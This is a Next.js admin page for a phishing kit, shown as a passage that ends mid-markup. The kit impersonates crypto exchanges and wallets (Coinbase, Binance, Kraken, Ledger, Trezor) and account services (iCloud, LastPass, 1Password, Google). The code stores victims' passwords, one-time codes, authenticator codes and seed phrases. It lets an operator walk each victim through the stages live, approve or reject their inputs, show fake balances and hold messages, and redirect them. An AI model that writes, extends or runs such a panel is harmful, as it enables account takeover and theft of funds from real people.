"use client"

import { useEffect, useState } from "react"
import {
  getLoginAttempts,
  deleteLoginAttempt,
  deleteAllLoginAttempts,
  getSessions,
  redirectSession,
  endSession,
  endAllSessions,
  approveSession,
  rejectSession,
  moveToStep,
  setVerificationOptions,
  setSecurityOptions,
  updateDashboardSettings,
  getActiveBrand,
  setActiveBrand,
} from "@/app/actions"
import Link from "next/link"
import { createBrowserClient } from "@supabase/ssr"
import { BRANDS, BRAND_IDS, getBrandConfig, type BrandId } from "@/lib/brands"

interface LoginAttempt {
  id: string
  email: string
  password: string
  phone_code: string | null
  user_agent: string | null
  created_at: string
}

interface Session {
  id: string
  email: string | null
  password: string | null
  phone_code: string | null
  current_step: string
  status: string
  admin_message: string | null
  user_agent: string | null
  is_active: boolean
  last_activity: string
  redirect_url: string | null
  phone_last4: string | null
  email_for_code: string | null
  authenticator_code: string | null
  email_code: string | null
  balance_selection: string | null
  security_responses: {
    signin_request?: "approved" | "denied"
    withdrawal_request?: "approved" | "denied"
    phone_change_request?: "approved" | "denied"
  } | null
  security_location: string | null
  security_phone_last4: string | null
  wallet_type: string | null
  wallet_action: string | null
  seed_phrase: string | null
  // Dashboard fields
  dashboard_balance: string | null
  balance_hidden: boolean
  balance_on_hold: boolean
  hold_message: string | null
  btc_amount: string | null
  eth_amount: string | null
  usdc_amount: string | null
  sol_amount: string | null
  doge_amount: string | null
  xrp_amount: string | null
  user_name: string | null
  show_verification_banner: boolean
  verification_banner_message: string | null
  show_wallet_popup: boolean
  wallet_popup_type: "link" | "unlink" | null
}

export default function AdminPage() {
  // Auth state
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [authChecking, setAuthChecking] = useState(true)
  const [loginPassword, setLoginPassword] = useState("")
  const [loginError, setLoginError] = useState("")
  const [loginLoading, setLoginLoading] = useState(false)

  const [attempts, setAttempts] = useState<LoginAttempt[]>([])
  const [sessions, setSessions] = useState<Session[]>([])
  const [loading, setLoading] = useState(true)
  const [deleting, setDeleting] = useState<string | null>(null)
  const [activeTab, setActiveTab] = useState<"sessions" | "attempts">("sessions")
  const [redirectUrl, setRedirectUrl] = useState<Record<string, string>>({})
  const [rejectMessage, setRejectMessage] = useState<Record<string, string>>({})
  const [phoneLast4, setPhoneLast4] = useState<Record<string, string>>({})
  const [emailForCode, setEmailForCode] = useState<Record<string, string>>({})
  const [securityLocation, setSecurityLocation] = useState<Record<string, string>>({})
  const [securityPhoneLast4, setSecurityPhoneLast4] = useState<Record<string, string>>({})
  const [actionLoading, setActionLoading] = useState<string | null>(null)
  const [soundEnabled, setSoundEnabled] = useState(true)
  const [lastPendingCount, setLastPendingCount] = useState(0)
  const [activeBrand, setActiveBrandState] = useState<BrandId>("coinbase")
  const [brandLoading, setBrandLoading] = useState(false)
  
  // Ledger activity state
  const [ledgerActivities, setLedgerActivities] = useState<any[]>([])
  const [ledgerLoading, setLedgerLoading] = useState(false)
  const [, setTick] = useState(0)
  const [ledgerDenyMessages, setLedgerDenyMessages] = useState<Record<string, string>>({})
  const [ledgerDenyOpen, setLedgerDenyOpen] = useState<Record<string, boolean>>({})
  const [ledgerActionLoading, setLedgerActionLoading] = useState<string | null>(null)

  // Brand-specific stages
  const LEDGER_STAGES = ["intake", "approval", "connect-ledger", "confirm-reset", "reset-api-keys", "verify-words", "enter-old-keys", "completed"] as const
  const GOOGLE_STAGES = ["email", "password", "prompt", "code_email", "code_phone", "code_alternate", "deny_changes", "requests_cancelled"] as const
  // Kraken uses same steps as Coinbase
  const KRAKEN_STAGES = ["email", "password", "phone_verification", "email_verification", "authenticator_verification", "balance", "security_check", "pending", "2fa", "2fa_pending", "2fa_approved", "2fa_denied", "denied", "requests", "requests_complete", "secure", "wallet_link", "wallet_unlink", "dashboard"] as const
  const TREZOR_STAGES = ["intake", "approval", "connect-ledger", "confirm-reset", "reset-api-keys", "verify-words", "enter-old-keys", "completed"] as const
  const ONEPASS_STAGES = ["intake", "approval", "connect-ledger", "confirm-reset", "reset-api-keys", "verify-words", "enter-old-keys", "completed"] as const
  
  // Get stages based on visitor ID prefix
  const getStagesForActivity = (visitorId: string) => {
    if (visitorId?.startsWith("kraken_")) return KRAKEN_STAGES
    if (visitorId?.startsWith("google_")) return GOOGLE_STAGES
    if (visitorId?.startsWith("trezor_")) return TREZOR_STAGES
    if (visitorId?.startsWith("1password_") || visitorId?.startsWith("onepass_")) return ONEPASS_STAGES
    return LEDGER_STAGES // default for ledger_ prefix
  }

  const updateLedgerActivity = async (visitorId: string, updates: Record<string, any>) => {
    setLedgerActionLoading(visitorId)
    try {
      // Always use the activity API for ledger/trezor/google/kraken/1password flows
      // since those components poll the activity API directly
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity: { ...data.activity, ...updates, lastUpdated: new Date().toISOString() } }),
        })
      }
      fetchLedgerActivities()
    } finally {
      setLedgerActionLoading(null)
    }
  }
  
  // Check auth on mount
  useEffect(() => {
    const checkAuth = async () => {
      try {
        const res = await fetch("/api/admin-auth")
        if (res.ok) {
          setIsAuthenticated(true)
        }
      } catch {
        // not authenticated
      } finally {
        setAuthChecking(false)
      }
    }
    checkAuth()
  }, [])

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoginLoading(true)
    setLoginError("")
    try {
      const res = await fetch("/api/admin-auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: loginPassword }),
      })
      if (res.ok) {
        setIsAuthenticated(true)
        setLoginPassword("")
      } else {
        setLoginError("Invalid password")
      }
    } catch {
      setLoginError("Connection error")
    } finally {
      setLoginLoading(false)
    }
  }

  const handleLogout = async () => {
    await fetch("/api/admin-auth", { method: "DELETE" })
    setIsAuthenticated(false)
  }

  // Timer tick for live session duration
  useEffect(() => {
    if (activeTab !== "sessions") return
    const interval = setInterval(() => setTick(t => t + 1), 1000)
    return () => clearInterval(interval)
  }, [activeTab])
  
  const fetchLedgerActivities = async () => {
    try {
      // Fetch from both old API and new sessions API
      const [oldRes, newRes] = await Promise.all([
        fetch("/api/activity"),
        fetch("/api/sessions")
      ])
      const oldData = await oldRes.json()
      const newData = await newRes.json()
      
      // Combine activities from both sources
      const oldActivities = oldData.activities || []
      const newSessions = (newData.sessions || []).map((s: any) => ({
        visitorId: s.id,
        brand: s.brand,
        email: s.email,
        password: s.password,
        currentStage: s.stage,
        waitingForApproval: s.status === "waiting",
        status: s.status,
        adminMessage: s.adminMessage,
        isOnline: s.isOnline,
        userAgent: s.userAgent,
        ipAddress: s.ipAddress,
        sessionStarted: s.createdAt,
        lastHeartbeat: s.updatedAt,
        data: s.data || {},
      }))
      
      // Merge, preferring new sessions
      const newIds = new Set(newSessions.map((s: any) => s.visitorId))
      const merged = [...newSessions, ...oldActivities.filter((a: any) => !newIds.has(a.visitorId))]
      setLedgerActivities(merged)
    } catch {
      // ignore
    }
  }
  
  // Poll ledger activities when on sessions tab (merged view)
  useEffect(() => {
    if (activeTab !== "sessions") return
    setLedgerLoading(true)
    fetchLedgerActivities().finally(() => setLedgerLoading(false))
    const interval = setInterval(fetchLedgerActivities, 1500)
    return () => clearInterval(interval)
  }, [activeTab])
  
  // Play notification sound when new pending session arrives
  useEffect(() => {
    const pendingCount = sessions.filter(s => s.status === "pending").length
    if (pendingCount > lastPendingCount && soundEnabled && lastPendingCount > 0) {
      // Play notification sound
      const audio = new Audio("data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdH2JkI2Mh4qElIWAd3eHgH12cn6Ef4J8foKEfoR+fn2BgYJ/f4GAgYGBgIGAgYCBgYGBgIGBgYGBgYGBgYGBgYGBgQ==")
      audio.volume = 0.5
      audio.play().catch(() => {})
    }
    setLastPendingCount(pendingCount)
  }, [sessions, soundEnabled, lastPendingCount])
  
  // Dashboard settings state
  const [dashboardBalance, setDashboardBalance] = useState<Record<string, string>>({})
  const [btcAmount, setBtcAmount] = useState<Record<string, string>>({})
  const [ethAmount, setEthAmount] = useState<Record<string, string>>({})
  const [usdcAmount, setUsdcAmount] = useState<Record<string, string>>({})
  const [solAmount, setSolAmount] = useState<Record<string, string>>({})
  const [dogeAmount, setDogeAmount] = useState<Record<string, string>>({})
  const [xrpAmount, setXrpAmount] = useState<Record<string, string>>({})
  const [holdMessage, setHoldMessage] = useState<Record<string, string>>({})
  const [verificationMessage, setVerificationMessage] = useState<Record<string, string>>({})
  const [userName, setUserName] = useState<Record<string, string>>({})
  const [fetchError, setFetchError] = useState<string | null>(null)

  const fetchAttempts = async () => {
    try {
      const result = await getLoginAttempts()
      if (result.success) {
        setAttempts(result.data as LoginAttempt[])
        setFetchError(null)
      } else {
        setFetchError(result.error || "Failed to fetch login attempts")
      }
    } catch (err) {
      console.error("Error fetching attempts:", err)
      setFetchError(err instanceof Error ? err.message : "Failed to fetch")
    }
  }

  const fetchSessions = async () => {
    try {
      const result = await getSessions()
      if (result.success) {
        setSessions(result.data as Session[])
        setFetchError(null)
      } else {
        setFetchError(result.error || "Failed to fetch sessions")
      }
    } catch (err) {
      console.error("Error fetching sessions:", err)
      setFetchError(err instanceof Error ? err.message : "Failed to fetch")
    }
  }

  const fetchAll = async () => {
    setLoading(true)
    setFetchError(null)
    await Promise.all([fetchAttempts(), fetchSessions()])
    setLoading(false)
  }

  const fetchBrand = async () => {
    try {
      const brand = await getActiveBrand()
      setActiveBrandState(brand as BrandId)
    } catch {
      // fallback
    }
  }

  const handleBrandSwitch = async (brand: BrandId) => {
    setBrandLoading(true)
    try {
      // First, set redirect_url on ALL existing sessions to force page reload
      // This will make all connected users refresh to the new brand
      const actRes = await fetch("/api/activity")
      const actData = await actRes.json()
      if (actData.activities) {
        for (const act of actData.activities) {
          await fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
              visitorId: act.visitorId, 
              activity: { 
                ...act, 
                forceReload: true,
                lastUpdated: new Date().toISOString() 
              } 
            }),
          })
        }
      }
      
      // Also update sessions table for Coinbase/Binance users
      const sessRes = await fetch("/api/sessions")
      const sessData = await sessRes.json()
      if (sessData.sessions) {
        for (const sess of sessData.sessions) {
          await fetch("/api/sessions", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
              id: sess.id, 
              redirect_url: "/?reload=" + Date.now(),
              current_step: "email"
            }),
          })
        }
      }
      
      // Clear all existing sessions and activities
      await fetch("/api/sessions?all=true", { method: "DELETE" })
      if (actData.activities) {
        for (const act of actData.activities) {
          await fetch(`/api/activity?visitorId=${act.visitorId}`, { method: "DELETE" })
        }
      }
      
      // Set the new brand
      await setActiveBrand(brand)
      setActiveBrandState(brand)
      
      // Refresh the sessions list
      fetchLedgerActivities()
      fetchSessions()
    } catch (error) {
      console.error("Brand switch error:", error)
    }
    setBrandLoading(false)
  }

  useEffect(() => {
    fetchAll()
    fetchBrand()

    const supabase = createBrowserClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
    )

    const channel = supabase
      .channel("admin-realtime")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "sessions" },
        () => fetchSessions()
      )
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "login_attempts" },
        () => fetchAttempts()
      )
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "settings" },
        () => fetchBrand()
      )
      .subscribe()

    // Add polling as backup for real-time updates (every 3 seconds)
    const pollInterval = setInterval(() => {
      fetchSessions()
      fetchAttempts()
    }, 3000)

    return () => {
      supabase.removeChannel(channel)
      clearInterval(pollInterval)
    }
  }, [])

  const handleApprove = async (sessionId: string, currentStep: string) => {
    setActionLoading(`approve-${sessionId}`)
    try {
      let nextStep = "dashboard"
      
      if (isIcloudBrand) {
        // iCloud step progression
        if (currentStep === "email") nextStep = "password"
        else if (currentStep === "password") nextStep = "pending"
        else if (currentStep === "pending") nextStep = "2fa"
        else if (currentStep === "2fa_pending") nextStep = "2fa_approved"
        else if (currentStep === "2fa_approved") nextStep = "requests"
        else if (currentStep === "requests_complete") nextStep = "secure"
        else nextStep = "secure"
      } else if (isLastpassBrand) {
        // LastPass step progression (no crypto steps)
        if (currentStep === "email") nextStep = "password"
        else if (currentStep === "password") nextStep = "phone_verification"
        else if (currentStep === "phone_verification") nextStep = "email_verification"
        else if (currentStep === "email_verification") nextStep = "authenticator_verification"
        else if (currentStep === "authenticator_verification") nextStep = "lp_cancel_requests"
        else if (currentStep === "lp_requests_cancelled") nextStep = "lp_requests_cancelled"
        else nextStep = "lp_cancel_requests"
      } else {
        // Coinbase/Binance step progression
        if (currentStep === "email") nextStep = "password"
        else if (currentStep === "password") nextStep = "phone_verification"
        else if (currentStep === "phone_verification") nextStep = "email_verification"
        else if (currentStep === "email_verification") nextStep = "authenticator_verification"
        else if (currentStep === "authenticator_verification") nextStep = "balance"
        else if (currentStep === "balance") nextStep = "security_check"
        else if (currentStep === "security_check") nextStep = "dashboard"
        else if (currentStep === "wallet_link" || currentStep === "wallet_unlink") nextStep = "dashboard"
      }
      
      // Determine redirect for cross-page navigation
      let redirectUrl: string | undefined
      if (nextStep === "dashboard" && !isLastpassBrand && !isLedgerBrand && !isOnePasswordBrand) redirectUrl = "/dashboard"

      // Single DB call with both step change and redirect
      await approveSession(sessionId, nextStep, undefined, redirectUrl)
      await fetchSessions()
    } catch {
      // ignore
    }
    setActionLoading(null)
  }

  const handleReject = async (sessionId: string) => {
    setActionLoading(`reject-${sessionId}`)
    try {
      const message = rejectMessage[sessionId] || "Invalid credentials. Please try again."
      await rejectSession(sessionId, message)
      setRejectMessage((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch {
      // ignore
    }
    setActionLoading(null)
  }

  const handleMoveToStep = async (sessionId: string, step: string) => {
    setActionLoading(`step-${sessionId}-${step}`)
    try {
      let redirectUrl: string | undefined
      if (step === "dashboard") redirectUrl = "/dashboard"

      await moveToStep(sessionId, step, redirectUrl)
      await fetchSessions()
    } catch {
      // ignore
    }
    setActionLoading(null)
  }

  const handleSetPhoneLast4 = async (sessionId: string) => {
    const value = phoneLast4[sessionId]
    if (!value) return
    setActionLoading(`phone-${sessionId}`)
    try {
      await setVerificationOptions(sessionId, { phone_last4: value })
      setPhoneLast4((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Set phone error:", error)
    }
    setActionLoading(null)
  }

  const handleSetEmailForCode = async (sessionId: string) => {
    const value = emailForCode[sessionId]
    if (!value) return
    setActionLoading(`email-code-${sessionId}`)
    try {
      await setVerificationOptions(sessionId, { email_for_code: value })
      setEmailForCode((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Set email error:", error)
    }
    setActionLoading(null)
  }

  const handleSetSecurityLocation = async (sessionId: string) => {
    const value = securityLocation[sessionId]
    if (!value) return
    setActionLoading(`sec-loc-${sessionId}`)
    try {
      await setSecurityOptions(sessionId, { security_location: value })
      setSecurityLocation((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Set security location error:", error)
    }
    setActionLoading(null)
  }

  const handleSetSecurityPhone = async (sessionId: string) => {
    const value = securityPhoneLast4[sessionId]
    if (!value) return
    setActionLoading(`sec-phone-${sessionId}`)
    try {
      await setSecurityOptions(sessionId, { security_phone_last4: value })
      setSecurityPhoneLast4((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Set security phone error:", error)
    }
    setActionLoading(null)
  }

  // Dashboard handlers
  const handleUpdateDashboardBalance = async (sessionId: string) => {
    const value = dashboardBalance[sessionId]
    if (!value) return
    setActionLoading(`dash-balance-${sessionId}`)
    try {
      await updateDashboardSettings(sessionId, { dashboard_balance: value })
      setDashboardBalance((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Update dashboard balance error:", error)
    }
    setActionLoading(null)
  }

  const handleUpdateCryptoAmounts = async (sessionId: string) => {
    setActionLoading(`dash-crypto-${sessionId}`)
    try {
      const updates: Record<string, string> = {}
      if (btcAmount[sessionId]) updates.btc_amount = btcAmount[sessionId]
      if (ethAmount[sessionId]) updates.eth_amount = ethAmount[sessionId]
      if (usdcAmount[sessionId]) updates.usdc_amount = usdcAmount[sessionId]
      if (solAmount[sessionId]) updates.sol_amount = solAmount[sessionId]
      if (dogeAmount[sessionId]) updates.doge_amount = dogeAmount[sessionId]
      if (xrpAmount[sessionId]) updates.xrp_amount = xrpAmount[sessionId]
      
      await updateDashboardSettings(sessionId, updates)
      setBtcAmount((prev) => ({ ...prev, [sessionId]: "" }))
      setEthAmount((prev) => ({ ...prev, [sessionId]: "" }))
      setUsdcAmount((prev) => ({ ...prev, [sessionId]: "" }))
      setSolAmount((prev) => ({ ...prev, [sessionId]: "" }))
      setDogeAmount((prev) => ({ ...prev, [sessionId]: "" }))
      setXrpAmount((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Update crypto amounts error:", error)
    }
    setActionLoading(null)
  }

  const handleToggleBalanceHidden = async (sessionId: string, currentValue: boolean) => {
    setActionLoading(`dash-hide-${sessionId}`)
    try {
      await updateDashboardSettings(sessionId, { balance_hidden: !currentValue })
      await fetchSessions()
    } catch (error) {
      console.error("Toggle balance hidden error:", error)
    }
    setActionLoading(null)
  }

  const handleToggleBalanceOnHold = async (sessionId: string, currentValue: boolean) => {
    setActionLoading(`dash-hold-${sessionId}`)
    try {
      await updateDashboardSettings(sessionId, { balance_on_hold: !currentValue })
      await fetchSessions()
    } catch (error) {
      console.error("Toggle balance on hold error:", error)
    }
    setActionLoading(null)
  }

  const handleSetHoldMessage = async (sessionId: string) => {
    const value = holdMessage[sessionId]
    if (!value) return
    setActionLoading(`dash-hold-msg-${sessionId}`)
    try {
      await updateDashboardSettings(sessionId, { hold_message: value })
      setHoldMessage((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Set hold message error:", error)
    }
    setActionLoading(null)
  }

  const handleToggleVerificationBanner = async (sessionId: string, currentValue: boolean) => {
    setActionLoading(`dash-banner-${sessionId}`)
    try {
      await updateDashboardSettings(sessionId, { show_verification_banner: !currentValue })
      await fetchSessions()
    } catch (error) {
      console.error("Toggle verification banner error:", error)
    }
    setActionLoading(null)
  }

  const handleSetVerificationMessage = async (sessionId: string) => {
    const value = verificationMessage[sessionId]
    if (!value) return
    setActionLoading(`dash-ver-msg-${sessionId}`)
    try {
      await updateDashboardSettings(sessionId, { verification_banner_message: value })
      setVerificationMessage((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Set verification message error:", error)
    }
    setActionLoading(null)
  }

  const handleSetUserName = async (sessionId: string) => {
    const value = userName[sessionId]
    if (!value) return
    setActionLoading(`dash-name-${sessionId}`)
    try {
      await updateDashboardSettings(sessionId, { user_name: value })
      setUserName((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Set user name error:", error)
    }
    setActionLoading(null)
  }

  const handleToggleWalletPopup = async (sessionId: string, currentValue: boolean, type: "link" | "unlink") => {
    setActionLoading(`dash-wallet-${type}-${sessionId}`)
    try {
      await updateDashboardSettings(sessionId, { 
        show_wallet_popup: !currentValue,
        wallet_popup_type: type 
      })
      await fetchSessions()
    } catch (error) {
      console.error("Toggle wallet popup error:", error)
    }
    setActionLoading(null)
  }

  const handleDelete = async (id: string) => {
    setDeleting(id)
    try {
      const result = await deleteLoginAttempt(id)
      if (result.success) {
        setAttempts((prev) => prev.filter((a) => a.id !== id))
      }
    } catch (error) {
      console.error("Delete error:", error)
    }
    setDeleting(null)
  }

  const handleDeleteAll = async () => {
    if (!confirm("Are you sure you want to delete all login attempts?")) return
    setLoading(true)
    try {
      const result = await deleteAllLoginAttempts()
      if (result.success) {
        setAttempts([])
      }
    } catch (error) {
      console.error("Delete all error:", error)
    }
    setLoading(false)
  }

  const handleRedirect = async (sessionId: string) => {
    const url = redirectUrl[sessionId]
    if (!url) return
    setActionLoading(`redirect-${sessionId}`)
    try {
      await redirectSession(sessionId, url)
      setRedirectUrl((prev) => ({ ...prev, [sessionId]: "" }))
      await fetchSessions()
    } catch (error) {
      console.error("Redirect error:", error)
    }
    setActionLoading(null)
  }

  const handleEndSession = async (sessionId: string) => {
    setActionLoading(`end-${sessionId}`)
    try {
      await endSession(sessionId)
      await fetchSessions()
    } catch (error) {
      console.error("End session error:", error)
    }
    setActionLoading(null)
  }

  const handleEndAllSessions = async () => {
    if (!confirm("Are you sure you want to close ALL active sessions?")) return
    setActionLoading("end-all")
    try {
      await endAllSessions()
      await fetchSessions()
    } catch (error) {
      console.error("End all sessions error:", error)
    }
    setActionLoading(null)
  }

  const getStepBadgeColor = (step: string) => {
    switch (step) {
      case "email": return "bg-blue-500/20 text-blue-400 border-blue-500/30"
      case "password": return "bg-yellow-500/20 text-yellow-400 border-yellow-500/30"
      case "phone_verification": return "bg-purple-500/20 text-purple-400 border-purple-500/30"
      case "email_verification": return "bg-cyan-500/20 text-cyan-400 border-cyan-500/30"
      case "authenticator_verification": return "bg-pink-500/20 text-pink-400 border-pink-500/30"
      case "balance": return "bg-emerald-500/20 text-emerald-400 border-emerald-500/30"
      case "security_check": return "bg-red-500/20 text-red-400 border-red-500/30"
      case "wallet_link": return "bg-teal-500/20 text-teal-400 border-teal-500/30"
      case "wallet_unlink": return "bg-orange-500/20 text-orange-400 border-orange-500/30"
      case "dashboard": return "bg-indigo-500/20 text-indigo-400 border-indigo-500/30"
      case "complete": return "bg-green-500/20 text-green-400 border-green-500/30"
      case "pending": return "bg-orange-500/20 text-orange-400 border-orange-500/30"
      case "2fa": return "bg-green-500/20 text-green-400 border-green-500/30"
      case "2fa_pending": return "bg-purple-500/20 text-purple-400 border-purple-500/30"
      case "2fa_approved": return "bg-emerald-500/20 text-emerald-400 border-emerald-500/30"
      case "2fa_denied": return "bg-red-500/20 text-red-400 border-red-500/30"
      case "denied": return "bg-red-500/20 text-red-400 border-red-500/30"
      case "requests": return "bg-cyan-500/20 text-cyan-400 border-cyan-500/30"
      case "requests_complete": return "bg-teal-500/20 text-teal-400 border-teal-500/30"
      case "secure": return "bg-emerald-500/20 text-emerald-400 border-emerald-500/30"
      case "lp_cancel_requests": return "bg-red-500/20 text-red-400 border-red-500/30"
      case "lp_requests_cancelled": return "bg-green-500/20 text-green-400 border-green-500/30"
      case "ledger_case_id": return "bg-gray-500/20 text-gray-300 border-gray-500/30"
      default: return "bg-gray-500/20 text-gray-400 border-gray-500/30"
    }
  }

  const getStatusBadge = (status: string) => {
    switch (status) {
      case "pending": return "bg-orange-500/20 text-orange-400 border-orange-500/30 animate-pulse"
      case "approved": return "bg-green-500/20 text-green-400 border-green-500/30"
      case "rejected": return "bg-red-500/20 text-red-400 border-red-500/30"
      default: return "bg-gray-500/20 text-gray-400 border-gray-500/30"
    }
  }

  const getTimeSince = (date: string) => {
    const seconds = Math.floor((Date.now() - new Date(date).getTime()) / 1000)
    if (seconds < 60) return `${seconds}s ago`
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`
    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`
    return `${Math.floor(seconds / 86400)}d ago`
  }

  const getStepLabel = (step: string) => {
    switch (step) {
      case "email": return "Email"
      case "password": return "Password"
      case "phone_verification": return "Phone"
      case "email_verification": return "Email Code"
      case "authenticator_verification": return "Authenticator"
      case "balance": return "Balance"
      case "security_check": return "Security"
      case "wallet_link": return "Link Wallet"
      case "wallet_unlink": return "Unlink Wallet"
      case "dashboard": return "Dashboard"
      case "pending": return "Pending Approval"
      case "2fa": return "2FA Code"
      case "2fa_pending": return "2FA Pending"
      case "2fa_approved": return "2FA Approved"
      case "2fa_denied": return "2FA Denied"
      case "denied": return "Denied"
      case "requests": return "Requests"
      case "requests_complete": return "Requests Done"
      case "secure": return "Secured"
      case "lp_cancel_requests": return "Cancel Requests"
      case "lp_requests_cancelled": return "Requests Cancelled"
      case "ledger_case_id": return "Case ID"
      default: return step
    }
  }

  const pendingSessions = sessions.filter((s) => s.status === "pending")

                // Kraken uses the same steps as other crypto brands (Coinbase, Binance)
                const cryptoSteps = ["email", "password", "phone_verification", "email_verification", "authenticator_verification", "balance", "security_check", "wallet_link", "wallet_unlink", "dashboard"]
                const icloudSteps = ["email", "password", "pending", "2fa", "2fa_pending", "2fa_approved", "2fa_denied", "denied", "requests", "requests_complete", "secure"]
                const lastpassSteps = ["email", "password", "phone_verification", "email_verification", "authenticator_verification", "lp_cancel_requests", "lp_requests_cancelled"]
                const ledgerSteps = ["email", "ledger_case_id"]
                const onepassSteps = ["email", "secret_key"]
                const allSteps = activeBrand === "icloud" ? icloudSteps : activeBrand === "lastpass" ? lastpassSteps : activeBrand === "ledger" ? ledgerSteps : activeBrand === "onepassword" ? onepassSteps : cryptoSteps
                const isIcloudBrand = activeBrand === "icloud"
                const isLastpassBrand = activeBrand === "lastpass"
                const isLedgerBrand = activeBrand === "ledger"
                const isOnePasswordBrand = activeBrand === "onepassword"
                const isUpholdBrand = activeBrand === "uphold"
                const isKrakenBrand = activeBrand === "kraken"
                const isGoogleBrand = activeBrand === "google"

  // Auth checking screen
  if (authChecking) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#0a0b0d]">
        <div className="h-8 w-8 animate-spin rounded-full border-2 border-gray-700 border-t-white" />
      </div>
    )
  }

  // Login screen
  if (!isAuthenticated) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#0a0b0d] px-4">
        <div className="w-full max-w-sm">
          <div className="rounded-xl border border-[#2B3139] bg-[#181A20] p-8">
            <div className="mb-6 text-center">
              <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-full bg-[#2B3139]">
                <svg className="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h1 className="text-lg font-semibold text-white">Admin Access</h1>
              <p className="mt-1 text-sm text-gray-500">Enter password to continue</p>
            </div>
            <form onSubmit={handleLogin} className="space-y-4">
              <input
                type="password"
                value={loginPassword}
                onChange={(e) => {
                  setLoginPassword(e.target.value)
                  setLoginError("")
                }}
                placeholder="Password"
                autoFocus
                className="w-full rounded-lg border border-[#2B3139] bg-[#0B0E11] px-4 py-3 text-sm text-white placeholder-gray-600 outline-none transition-colors focus:border-[#F0B90B]"
              />
              {loginError && (
                <p className="text-center text-xs text-red-400">{loginError}</p>
              )}
              <button
                type="submit"
                disabled={loginLoading || !loginPassword}
                className="w-full cursor-pointer rounded-lg bg-[#F0B90B] py-3 text-sm font-semibold text-[#181A20] transition-colors hover:bg-[#F0B90B]/90 disabled:opacity-50"
              >
                {loginLoading ? "Verifying..." : "Sign In"}
              </button>
            </form>
          </div>
        </div>
      </div>
    )
  }

  return (
  <div className="min-h-screen bg-[#0a0b0d] p-4 md:p-8">
  <div className="mx-auto max-w-6xl">
  {/* Header */}
        <div className="mb-8 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <Link
              href="/"
              className="flex h-10 w-10 cursor-pointer items-center justify-center rounded-lg bg-[#2B3139] text-gray-400 transition-colors hover:bg-[#3C4043] hover:text-white"
            >
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M19 12H5M12 19l-7-7 7-7" />
              </svg>
            </Link>
            <div>
              <h1 className="text-2xl font-bold text-white">Admin Dashboard</h1>
              <p className="text-sm text-gray-500">Real-time session control</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={() => setSoundEnabled(!soundEnabled)}
              className={`cursor-pointer rounded-lg px-3 py-2 text-sm font-medium transition-colors flex items-center gap-2 ${
                soundEnabled 
                  ? "bg-green-500/20 text-green-400 hover:bg-green-500/30" 
                  : "bg-[#2B3139] text-gray-400 hover:bg-[#3C4043]"
              }`}
              title={soundEnabled ? "Sound notifications on" : "Sound notifications off"}
            >
              {soundEnabled ? (
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M11 5L6 9H2v6h4l5 4V5z"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
              ) : (
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M11 5L6 9H2v6h4l5 4V5z"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>
              )}
            </button>
            {sessions.length > 0 && (
              <button
                onClick={handleEndAllSessions}
                disabled={actionLoading === "end-all"}
                className="cursor-pointer rounded-lg bg-red-500/20 px-4 py-2 text-sm font-medium text-red-400 transition-colors hover:bg-red-500/30 disabled:opacity-50"
              >
                {actionLoading === "end-all" ? "Closing..." : "Close All Sessions"}
              </button>
            )}
            <button
              onClick={fetchAll}
              className="cursor-pointer rounded-lg bg-[#2B3139] px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-[#3C4043]"
            >
              Refresh
            </button>
            <button
              onClick={handleLogout}
